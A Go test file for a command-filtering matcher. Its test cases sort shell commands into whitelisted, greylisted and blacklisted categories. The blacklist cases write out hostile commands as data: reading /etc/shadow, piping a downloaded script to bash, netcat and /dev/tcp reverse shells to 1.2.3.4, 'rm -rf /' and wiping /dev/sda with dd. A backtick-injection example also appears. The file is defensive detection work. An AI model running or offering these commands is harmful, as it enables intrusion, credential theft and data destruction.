package filter

import (
	"regexp"
	"strings"
	"testing"
)

func TestWhitelistPattern(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		cmd      string
		filenames []string
		want     Result
	}{
		{"ls", nil, Whitelisted},
		{"ls -la", nil, Whitelisted},
		{"pwd", nil, Whitelisted},
		{"cd /tmp", nil, Whitelisted},
		{"echo hello", nil, Whitelisted},
		{"cat", []string{"/var/log/syslog"}, Whitelisted},
		{"cat", []string{"/etc/config.yaml"}, Whitelisted},
		{"ps aux", nil, Whitelisted},
		{"grep 'error'", []string{"/var/log/app.log"}, Whitelisted},
		{"tar -xzf archive.tar.gz", nil, Whitelisted},
		{"ssh user@host `ls`", nil, Greylisted}, // backticks make it suspicious
	}

	for _, tt := range tests {
		got, desc := m.Match(tt.cmd, tt.filenames)
		if got != tt.want {
			// Debug: show what target string looks like
			target := strings.TrimSpace(tt.cmd + " " + strings.Join(tt.filenames, " "))
			t.Errorf("Match(%q, %v) = %v (%s), want %v. Target: %q", tt.cmd, tt.filenames, got, desc, tt.want, target)
		}
	}
}

func TestBlacklistPattern(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		cmd      string
		filenames []string
		want     Result
	}{
		{"cat /etc/shadow", nil, Blacklisted},
		{"wget http://1.2.3.4/script.sh | bash", nil, Blacklisted},
		{"curl http://1.2.3.4/script.sh | bash", nil, Blacklisted},
		{"nc -e /bin/bash 1.2.3.4 4444", nil, Blacklisted},
		{"/dev/tcp/1.2.3.4/4444", nil, Blacklisted},
		{"nmap -sS -p 1-1000 target", nil, Blacklisted},
		{"chmod 4777 /bin/su", nil, Blacklisted},
		{"rm -rf /", nil, Blacklisted},
		{"dd if=/dev/zero of=/dev/sda", nil, Blacklisted},
	}

	for _, tt := range tests {
		got, desc := m.Match(tt.cmd, tt.filenames)
		if got != tt.want {
			target := strings.TrimSpace(tt.cmd + " " + strings.Join(tt.filenames, " "))
			t.Errorf("Match(%q, %v) = %v (%s), want %v. Target: %q", tt.cmd, tt.filenames, got, desc, tt.want, target)
		}
	}
}

func TestGreylistPattern(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		cmd      string
		filenames []string
		want     Result
	}{
		{"curl http://example.com/api", nil, Greylisted},
		{"wget http://example.com/file", nil, Greylisted},
		{"bash -c 'ls'", nil, Greylisted},
		{"python3 -m http.server 8000", nil, Greylisted},
		{"sudo ls", nil, Greylisted},
		{"chmod 755 script.sh", nil, Greylisted},
		{"chown root:root file", nil, Greylisted},
		{"useradd newuser", nil, Greylisted},
		{"passwd username", nil, Greylisted},
		{"/tmp/malware.sh", []string{"/tmp/malware.sh"}, Greylisted},
		{"curl http://api.example.com", nil, Greylisted},
	}

	for _, tt := range tests {
		got, desc := m.Match(tt.cmd, tt.filenames)
		if got != tt.want {
			target := strings.TrimSpace(tt.cmd + " " + strings.Join(tt.filenames, " "))
			t.Errorf("Match(%q, %v) = %v (%s), want %v. Target: %q", tt.cmd, tt.filenames, got, desc, tt.want, target)
		}
	}
}

func TestDefaultToGreylist(t *testing.T) {
	m := NewMatcher()

	// Unknown commands should default to greylist
	result, desc := m.Match("some_unknown_command", nil)
	if result != Greylisted {
		t.Errorf("expected Greylisted for unknown command, got %v", result)
	}
	if desc != "no matching pattern, default to AI analysis" {
		t.Errorf("unexpected description: %s", desc)
	}
}

func TestMatcherStats(t *testing.T) {
	m := NewMatcher()
	s := m.String()
	if s == "" {
		t.Error("String() should not be empty")
	}
}

func TestAddPattern(t *testing.T) {
	m := NewMatcher()

	// Add a custom whitelist pattern
	m.AddPattern(regexp.MustCompile("(?i)my-safe-cmd"), "my safe command", Whitelisted)

	result, _ := m.Match("my-safe-cmd", nil)
	if result != Whitelisted {
		t.Errorf("expected Whitelisted, got %v", result)
	}
}

func TestResultString(t *testing.T) {
	tests := []struct {
		r    Result
		want string
	}{
		{Whitelisted, "whitelisted"},
		{Blacklisted, "blacklisted"},
		{Greylisted, "greylisted"},
		{Result(255), "unknown"},
	}

	for _, tt := range tests {
		got := tt.r.String()
		if got != tt.want {
			t.Errorf("Result(%d).String() = %q, want %q", tt.r, got, tt.want)
		}
	}
}
